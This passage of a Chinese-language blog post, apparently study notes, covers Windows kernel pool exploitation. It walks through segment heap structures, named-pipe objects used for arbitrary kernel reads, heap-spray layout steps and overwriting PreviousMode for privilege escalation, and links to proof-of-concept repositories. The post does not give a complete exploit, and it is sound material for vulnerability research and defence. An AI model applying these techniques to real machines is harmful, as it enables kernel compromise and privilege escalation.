Uint8B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_FREE_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Header : _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 OverlapsHeader : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 Node : _RTL_BALANCED_NODE</span><br></pre></td></tr></table></figure>

<p>已被分配的块都以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Chunk-&gt;Sizes = Chunk-&gt;Sizes ^ Chunk ^ RtlpHpHeapGlobals ;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffff998533f74440 L2</span><br><span class="line">ffff9985`<span class="number">33f</span>74440  <span class="number">88</span>a74e1e`<span class="number">7e507045</span> ffff9985`<span class="number">00000049</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt _HEAP_VS_CHUNK_HEADER ffff998533f74440</span><br><span class="line">ntdll!_HEAP_VS_CHUNK_HEADER</span><br><span class="line">   +<span class="number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">   +<span class="number">0x008</span> EncodedSegmentPageOffset : <span class="number">0</span>y01001001 (<span class="number">0x49</span>)</span><br><span class="line">   +<span class="number">0x008</span> UnusedBytes      : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> SkipDuringWalk   : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> Spare            : <span class="number">0</span>y0000000000000000000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x008</span> AllocatedChunkBits : <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffff998520ad7080 -<span class="built_in">r1</span> (*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))</span><br><span class="line">(*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))                 [Type: _HEAP_VS_CHUNK_HEADER_SIZE]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">15</span>: <span class="number">0</span>)] MemoryCost       : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">31</span>:<span class="number">16</span>)] UnsafeSize       : <span class="number">0x7e50</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">15</span>: <span class="number">0</span>)] UnsafePrevSize   : <span class="number">0x4e1e</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">23</span>:<span class="number">16</span>)] Allocated        : <span class="number">0xa7</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyUShort        : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyULong         : <span class="number">0x7e507045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] HeaderBits       : <span class="number">0x88a74e1e7e507045</span> [Type: <span class="type">unsigned</span> __int64]</span><br></pre></td></tr></table></figure>

<p>在内部，VS分配器使用段分配器。它通过<code>_HEAP_VS_CONTXT</code>中的<code>_HEAP_SUBALLOCATOR_CALLBACKS</code>字段在<code>RtlpHpVsSubsegmentCreate</code>中使用。<strong>子分配器回调函数都与VS上下文和RtlpHpHeapGlobals地址进行异或</strong>。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">callbacks.Allocate = RtlpHpSegVsAllocate;</span><br><span class="line">callbacks.Free = RtlpHpSegLfhVsFree;</span><br><span class="line">callbacks.Commit = RtlpHpSegLfhVsCommit;</span><br><span class="line">callbacks.Decommit = RtlpHpSegLfhVsDecommit;</span><br><span class="line">callbacks.ExtendContext = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h5 id="Low-Fragmentation-Heap-Backend"><a href="#Low-Fragmentation-Heap-Backend" class="headerlink" title="Low Fragmentation Heap Backend"></a>Low Fragmentation Heap Backend</h5><p>Low Fragmentation Heap Backend是一个后端，专门为从1B ~ 512 B 分配。LFH后端上下文存储在_HEAP_LFH_CONTEXT的结构体中。LFH后端的主要特点是使用不同大小的bucket来避免碎片化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_LFH_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x030 AffinityModArray : Ptr64 UChar</span><br><span class="line">+<span class="number">0</span> x038 MaxAffinity : UChar</span><br><span class="line">+<span class="number">0</span> x039 LockType : UChar</span><br><span class="line">+<span class="number">0</span> x03a MemStatsOffset : Int2B</span><br><span class="line">+<span class="number">0</span> x03c Config : _RTL_HP_LFH_CONFIG</span><br><span class="line">+<span class="number">0</span> x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">+<span class="number">0</span> x048 SubsegmentCreationLock : Uint8B</span><br><span class="line">+<span class="number">0</span> x080 Buckets : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure>

<h5 id="缓存对齐"><a href="#缓存对齐" class="headerlink" title="缓存对齐"></a>缓存对齐</h5><p>随着内核层堆分配器的更新，<code>_POOL_HEADER</code>的大部分字段都是无用的</p>
<p>但是PoolTag和PoolType都是比较重要的</p>
<p>调用了ExAllocatePoolWithTag时,如果PoolType设置了CacheAligned,那么返回的内存将是与缓存行大小对齐的,这个值取决于cpu,通常为0x40。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br></pre></td></tr></table></figure>

<p>如果分配的地址没有正确的对齐，那么块可能会有两个headers。</p>
<h4 id="Generic-Exploitation"><a href="#Generic-Exploitation" class="headerlink" title="Generic Exploitation"></a>Generic Exploitation</h4><p>堆溢出，幽灵块，这里介绍了的攻击方式，都是NamedPipe，分别在PagedPool和NonPagedPool中</p>
<h5 id="PipeAttribute"><a href="#PipeAttribute" class="headerlink" title="PipeAttribute"></a>PipeAttribute</h5><p>BigPool: 分配必须足够大(x64上为4064+字节)才能在大池中处理</p>
<p>论文中介绍了PagedPool的比较好用的任意读写的方法：PipeAttribute</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span> *AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> *AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>分配的大小和数据完全由攻击者控制。<code>AttributeName</code>和<code>AttributeValue</code>是指向数据字段的不同偏移的指针。 可以使用<code>NtFsControlFile</code>系统调用和<code>0x11003C</code>控制码在管道上创建管道属性，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HANDLE read_pipe;</span><br><span class="line">HANDLE write_pipe;</span><br><span class="line"><span class="type">char</span> attribute[] = <span class="string">&quot; attribute_name \00 attribute_value &quot;</span>;</span><br><span class="line"><span class="type">char</span> output[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">CreatePipe</span>(read_pipe, write_pipe, <span class="literal">NULL</span>, bufsize);</span><br><span class="line"><span class="built_in">NtFsControlFile</span>(write_pipe,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                &amp;status,</span><br><span class="line">                <span class="number">0x11003C</span>,</span><br><span class="line">                attribute,</span><br><span class="line">                <span class="built_in">sizeof</span>(attribute),</span><br><span class="line">                output,</span><br><span class="line">                <span class="built_in">sizeof</span>(output));</span><br></pre></td></tr></table></figure>

<p>然后可以使用<code>0x110038</code>控制码读取属性的值。<code>AttributeValue</code>指针和<code>AttributeValueSize</code>将用于读取属性的值并将其返回给用户。属性的值可以更改，但这将触发先前<code>PipeAttribute</code>的释放和新分配。</p>
<p>这意味着如果攻击者能够控制<code>PipeAttribute</code>的<code>AttributeValue</code>和<code>AttributeValueSize</code>字段，它可以在内核中读取任意数据，但不能任意写入。该对象还可以用于在内核中放置任意数据。这意味着它可以用于重新分配易受攻击块并控制幽灵块的内容。</p>
<h5 id="NpFr"><a href="#NpFr" class="headerlink" title="NpFr"></a>NpFr</h5><p>WriteFile写NamedPipe会获得chunk，也是可以造成任意读，只要能控制<code>Irp</code>和<code>isDataInKernel</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeQueueEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    IRP *linkedIRP;</span><br><span class="line">    __int64 SecurityClientContext;</span><br><span class="line">    <span class="type">int</span> isDataInKernel;</span><br><span class="line">    <span class="type">int</span> remaining_bytes__;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> field_2C;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读pipe</span></span><br><span class="line"><span class="keyword">if</span> (PipeQueueEntry-&gt;isDataAllocated == <span class="number">1</span>)</span><br><span class="line">    data_ptr = (PipeQueueEntry-&gt;linkedIRP-&gt;SystemBuffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data_ptr = PipeQueueEntry-&gt;data;</span><br><span class="line">[...] </span><br><span class="line"><span class="built_in">memmove</span>((<span class="type">void</span> *)(dst_buf + dst_len - cur_read_offset), &amp;data_ptr[PipeQueueEntry-&gt;DataSize - cur_entry_offset], copy_size);</span><br></pre></td></tr></table></figure>

<h4 id="spray"><a href="#spray" class="headerlink" title="spray"></a>spray</h4><p>为了获得第所需的内存布局，需要进行一些spray。spray取决于易受攻击的块的大小，因为它将最终分配到不同的分配后端。</p>
<p>为了简化spray过程，可以确保相应的<code>lookaside</code>为空。分配超过256个相同大小的块将确保这一点。</p>
<p>如果易受攻击的块小于0x200，则它将位于LFH（低碎片化堆）后端。然后，spray应该使用完全相同大小的块进行，对应桶的粒度取模，以确保它们都从同一个桶中分配。当请求分配时，LFH后端将按照最多32个块的组进行扫描<code>BlockBitmap</code>，并随机选择一个空闲块。在易受攻击的块分配之前和之后分配超过32个块应有助于打败随机化。</p>
<p>如果易受攻击的块大于<code>0x200</code>但小于<code>0x10000</code>，则它将位于可变大小（Variable Size）后端。然后，spray应该使用与易受攻击的块大小相等的大小进行。较大的块可能会被拆分，从而导致喷洒失败。首先，分配数千个所选大小的块，以确保首先将<code>FreeChunkTree</code>中大于所选大小的所有块清空，然后分配器将分配一个新的<code>0x10000</code>字节的VS子段并将其放入<code>FreeChunkTree</code>中。然后分配另外数千个块，它们将最终位于新的大空闲块中，从而连续。然后释放最后分配块的三分之一，以填充<code>FreeChunkTree</code>。只释放三分之一将确保不会合并任何块。然后让易受攻击的块分配。</p>
<p>最后，可以重新分配已释放的块以最大化喷洒机会。</p>
<p>由于完整的利用技术需要释放和重新分配易受攻击的块和幽灵块，为了方便释放块的恢复，启用相应的动态<code>lookaside</code>非常有趣。为此，一个简单的解决方案是分配数千个相应大小的块，等待2秒钟，然后再分配数千个块并等待1秒钟。这样，我们可以确保平衡集管理器已经重新平衡了相应的<code>lookaside</code>。分配数千个块确保<code>lookaside</code>将成为最常用的<code>lookaside</code>，并且将被启用，并且还确保它在其中有足够的空间。</p>
<h4 id="IO-Ring"><a href="#IO-Ring" class="headerlink" title="IO Ring"></a>IO Ring</h4><p>win11不错的漏洞利用对象。</p>
<p>复现了相关CVE：<a target="_blank" rel="noopener" href="https://github.com/Ha0-Y/CVE-2023-21768">CVE-2023-21768 Proof of Concept</a></p>
<h4 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h4><p>修改<code>_KTHREAD.PreviousMode</code>字段。</p>
<p>用户态程序调用系统的 Nt 或 Zw 时，系统调用机制会将调用线程捕获到内核模式。 为了标识参数源自用户模式，系统调用的处理程序将调用方线程对象中的 PreviousMode 字段设置为 UserMode。  </p>
<p>而内核态程序调用系统例程并将参数值传递给来自内核态的例程，当前线程对象中的 PreviousMode 字段应为 KernelMode。 </p>
<p>系统会检查调用线程的 PreviousMode 字段。这样通过参数就可以知道是来自用户态还是内核态了。</p>
<p>所以当 PreviousMode 设置为 1 时，来自用户空间的NT 或 Zw 版本函数调用将其中进行地址验证。在这种情况下，对内核内存的任意写将失败，因为此时PreviousMode是用户态的状态。当 PreviousMode 设置为 0 (此时是内核态) 时，将跳过地址验证写入任意内核内存地址，从而完成提权。</p>
<p>当我们替换<code>PreviousMode</code>为<code>0</code>后，这意味着我们可以使用<code>NtWriteVirtualMemory</code>在整个内核内存中进行不受约束的RW。</p>
<ul>
<li><code>NtReadVirtualMemory</code> 和 <code>NtWriteVirtualMemory</code> 调用函数相同（<code>MiReadWriteVirtualMemory</code>），因此在一定方面 NtWriteVirtualMemory 也可以任意读</li>
</ul>
<h4 id="New"><a href="#New" class="headerlink" title="New"></a>New</h4><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/updating-deprecated-exallocatepool-calls">ExAllocatePool2 和 ExAllocatePool3 </a>，在低版本的Windows系统中会导致无法加载驱动🤣</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DECLSPEC_RESTRICT PVOID <span class="title">ExAllocatePool2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  POOL_FLAGS Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T     NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  ULONG      Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Old code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(Allocation, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// New code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_PAGED, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="NPFS-SYS"><a href="#NPFS-SYS" class="headerlink" title="NPFS.SYS"></a>NPFS.SYS</h3><p>named pipe file system，常见的结构体</p>
<p>这一篇文章：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-278483.htm#msg_header_h2_4">新型Windows内核池风水利用工具研究</a></p>
<ul>
<li>命名管道的后端实现在一个名为NPFS.SYS驱动中，模块的主要实现和公开的<a target="_blank" rel="noopener" href="https://doxygen.reactos.org/dir_552a77878df93326bbe516beefdc08b2.html">npfs模块reactos源码</a>基本上大致相同。</li>
</ul>
<h4 id="DATA-QUEUE-ENTRY"><a href="#DATA-QUEUE-ENTRY" class="headerlink" title="DATA_QUEUE_ENTRY"></a>DATA_QUEUE_ENTRY</h4><p>Queue: 双向链表</p>
<p>SecurityContext</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nt!_SECURITY_CLIENT_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SecurityQos      : _SECURITY_QUALITY_OF_SERVICE</span><br><span class="line">   +<span class="number">0x010</span> ClientToken      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> DirectlyAccessClientToken : UChar</span><br><span class="line">   +<span class="number">0x019</span> DirectAccessEffectiveOnly : UChar</span><br><span class="line">   +<span class="number">0x01a</span> ServerIsRemote   : UChar</span><br><span class="line">   +<span class="number">0x01c</span> ClientTokenControl : _TOKEN_CONTROL</span><br></pre></td></tr></table></figure>

<p>EntryType</p>
<ul>
<li>Buffered Entries：这个值为0，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.data</code>读取数据</li>
<li>Unbuffered Entries: 值为1，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.Irp-&gt;AssociatedIrp.SystemBuffer</code>读取数据</li>
</ul>
<p><strong>QuotaInEntry</strong>: 被消耗</p>
<ul>
<li>buffered entries,：开始是DataSize，每当读取一次，就会较少，直到0</li>
<li>unbuffered entries：0</li>
</ul>
<p><strong>DataSize</strong>: user data的长度</p>
<p>x: padding</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;   </span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_NP_DATA_QUEUE</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY Queue;</span><br><span class="line">    ULONG QueueState;</span><br><span class="line">    ULONG BytesInQueue;</span><br><span class="line">    ULONG EntriesInQueue;</span><br><span class="line">    ULONG QuotaUsed;</span><br><span class="line">    ULONG ByteOffset;</span><br><span class="line">    ULONG Quota;</span><br><span class="line">&#125; NP_DATA_QUEUE, *PNP_DATA_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nSize指定了pipe的最大容量</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>通过<code>CreatePipe</code>创建命名管道文件对象，文件实例绑定了一个名为NP_DATA_QUEUE类型的队列对象</p>
<p>CreatePipe的参数nSize指定了当前pipe的最大容量或者说是允许最大缓冲区长度,每对pipe进行一次读写操作就会增加一个DATA_QUEUE_ENTRY。</p>
<p>若干次写可以对应若干次读,当存在读数据的请求时irp就会挂起,直到写入请求的数据量达到读取请求的数据量才会完成整个读取irp请求,比如说pipe的容量是1000,第一次写了1000的数据,这个写请求会返回,第二次又写了1000数据那么这个请求就一直挂起,直到读取了1000数据后,最后写入的数据小于或等于pipe的容量,后面写请求才会返回.</p>
<h4 id="npfs-NpAddDataQueueEntry"><a href="#npfs-NpAddDataQueueEntry" class="headerlink" title="npfs!NpAddDataQueueEntry"></a>npfs!NpAddDataQueueEntry</h4><p>可以下断点😋</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_REQUIRED_START 0x0000000000000001UI64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_USE_QUOTA 0x0000000000000001UI64 <span class="comment">// Charge quota</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_NON_PAGED 0x0000000000000040UI64 <span class="comment">// Non paged pool NX</span></span></span><br><span class="line"><span class="keyword">if</span> ( !a5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = Size + <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)Size + <span class="number">0x30</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)Size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xC000000D</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v15 = Size - a9;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 )</span><br><span class="line">      v15 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v26 = v15;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">0x30</span> &amp;&amp; _interlockedbittestandreset((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)(a3 + <span class="number">40</span>), <span class="number">0</span>) )</span><br><span class="line">      v16 = *(_QWORD *)(a3 + <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v16 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x41</span>i64, v14, <span class="string">&#x27;rFpN&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v26;</span><br><span class="line">LABEL_14:</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">36</span>) = v15;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">16</span>) = v13;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">24</span>) = v12;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">40</span>) = Size;</span><br><span class="line">      <span class="keyword">if</span> ( a4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13 )</span><br><span class="line">          v22 = *(<span class="type">const</span> <span class="type">void</span> **)(v13 + <span class="number">112</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v22 = a8;</span><br><span class="line">        <span class="built_in">memmove</span>((<span class="type">void</span> *)(v16 + <span class="number">48</span>), v22, (<span class="type">unsigned</span> <span class="type">int</span>)Size);</span><br><span class="line">        <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 &amp;&amp; v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">259</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v16 + <span class="number">16</span>) = <span class="number">0</span>i64;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">259</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_51:</span><br><span class="line">    <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="NonPagedPool-Overflow"><a href="#NonPagedPool-Overflow" class="headerlink" title="NonPagedPool Overflow"></a>NonPagedPool Overflow</h3><p><a target="_blank" rel="noopener" href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a></p>
<p>有源码以及详细的利用手法。</p>
<p>溢出覆盖一字节，也分别给出两种利用手段的exp</p>
